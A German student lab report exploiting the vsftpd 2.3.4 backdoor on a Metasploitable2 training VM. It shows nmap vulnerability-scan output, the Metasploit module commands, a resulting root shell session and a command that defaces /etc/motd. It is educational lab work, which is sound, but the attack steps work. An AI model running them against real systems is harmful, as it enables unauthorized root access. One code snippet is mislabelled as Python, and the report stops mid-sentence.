| Kategorie | Beschreibung |
| --------- | --------- |
| Name      | Jonas Wolfbauer |
| Klasse    | 4AHITS |
| Fach      | ITSE |
| Thema     | very safe FTP backdoor |
| Datum     | 23.02.2026 |

# Very Safe FTP Backdoor
Ziel der Übung ist auf ein bestimmtes Zielsystem einen Angriff zu starten - in diesem Fall eine Metasploitable2 VM.

# Übung (``msf`` Basics)

## Kleines Cheatsheet für metasploit:
| Modul | Beschreibung |
| --------- | --------- |
| ``auxiliary/scanner/ssh/ssh_version`` | Liefert SSH Version |
| ``auxiliary/scanner/http/title`` | Scannt Ziel nach HTTP Informationen |
| ``auxiliary/scanner/portscan/tcp`` | Liefert alle offenen TCP-Ports |
| ``auxiliary/scanner/ssl/ssl_version`` | Liefert SSL Version (falls vorhanden) |
| ``auxiliary/scanner/smb/smb_version:`` | Liefert SMB Version |

## Befehl ``setg``
Dieser Befehl setzt globale Variablen um wiederholtes Tippen zu vermeiden, praktisch für ``RHOSTS``, um die IP / Domain nur einmal festlegen zu müssen.

## Recherce

### ``msfvenom``
``msfvenom`` ist ein Tool, welches aus ``msfpayload`` und ``msfencode`` besteht und diese schließlich ersetzt hat.  
Es ist ein mächtiges Tool welches Payload generieren kann.

### ``Meterpreter``
Die Payload ``Meterpreter`` ist ebenfalls ein mächtiges Tool, welches dem Angreifer auf dem Zielsystem eine interaktive Shell bietet, dies zu gunsten von Exploiting.

# Übung (``nmap`` FTP scan)
Der ``nmap`` Scan wird verwendet um potenzielle Vulnerabilities zu finden. Dazu wird die ``nmap``-Option ``--script=vuln`` verwendet.

```bash
┌──(root㉿kali)-[~]
└─# nmap --script=vuln -p 21 192.168.1.51
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 06:39 -0500
Nmap scan report for 192.168.1.51
Host is up (0.00034s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|_      https://www.securityfocus.com/bid/48539
MAC Address: 00:0C:29:30:11:49 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
```

Die gefundene Sicherheitslücke kann im Internet recherchiert werden. Hierbei handelt es sich um ``CVE-2011-2523`` und beschreibt eine FTP Version, welche eine Shell Backdoor auf TCP Port ``6200`` öffnet.

Die Option ``--script=vuln`` gilt als Intrusive, da sie über die Informationsbeschaffung geht. Sie teste bekannte Schwachstellen aus um zu ermitteln ob diese vorhanden sind und nutzt deshalb auch potenzielle Schwachstellen aus.

Die Option ``-sC`` steht für ``--script default`` und verwendet nur Standardskripte. 
Die Option ``-A`` steht für einen aggresiveren Scan zur Beschaffung von Informationen und nicht für Schwachstellen Scan. Die Option ``-A`` ohne Vulnerability Scan wäre ohnehin schon "auffällig" genug.

# Übung (msf ``FTP`` Version herausfinden)
Das Moduls zum ``FTP`` Scanning kann mit ``auxiliary/scanner/ftp/ftp_version`` aufgerufen werden.

```bash
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.1.51:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Die Version von dem ``FTP``-Server lautet ``2.3.4``.

# Übung (msf ``vsftpd`` exploit)
Die Suche nach einem ``vsftpd`` Moduk welches eine Backdoor liefert ergibt das Moduls ``exploit/unix/ftp/vsftpd_234_backdoor``.

Um die Backdoor zu verwendet wurden folgende Schritte befolgt.

```bash
# Modul auswählen
use exploit/unix/ftp/vsftpd_234_backdoor

# Target setzen
set RHOSTS 192.168.1.51

# Starten
run
```

Daraufhin wurde der Target kontrolliert und bestätigt.
```bash
[*] 192.168.1.51:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.51:21 - USER: 331 Please specify the password.
[+] 192.168.1.51:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.51:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.53:39601 -> 192.168.1.51:6200) at 2026-02-23 07:04:17 -0500

ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz

whoami
root
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:30:11:49 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.51/24 brd 192.168.1.255 scope global eth0
    inet6 fe80::20c:29ff:fe30:1149/64 scope link
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:30:11:53 brd ff:ff:ff:ff:ff:ff
    inet 172.16.0.4/24 brd 172.16.0.255 scope global eth1
    inet6 fe80::20c:29ff:fe30:1153/64 scope link
       valid_lft forever preferred_lft forever
cat /etc/hostname
metasploitable
```

Bei der IP Adresse sowie Hostnamen handelt es sich um den Target. Der ``whoami`` Command bestätigt, dass man mit dem ``root`` User angemeldet ist.

Um eine Nachricht zu hinterlassen kann die MOTD unter ``etc/motd`` angepasst werden.

```bash
echo "you have been hacked!" >> /etc/motd
```

# Übung (exploit ohne msf)
Das Python Script, welches unter https://www.exploit-db.com/exploits/17491 gefunden werden kann, enthält eine ausschlaggebende Zeile.

```Python
		nsock = self.connect(false, {'RPORT' => 6200}) rescue nil

```

Das heißt Port ``6200`` wird für die Terminal Sitzung verwendet.  
Ebenfalls gibt es 



# Hilfreiche Quellen
- [Msfconsole Commands - Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/)
- [Metasploit Unleashed | MSFvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/)
- [Msfvenom](https://xinux.net/index.php/Msfvenom)
- [What is Meterpreter ? - Security Wiki](https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/)
- [CVE-2011-2523 Detail - NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [vuln NSE Category — Nmap Scripting Engine documentation](https://nmap.org/book/nse-usage.html#nse-category-vuln)
- [Miscellaneous Options | Nmap Network Scanning](https://nmap.org/book/man-misc-options.html)
- []()
- []()
- []()
- []()
- []()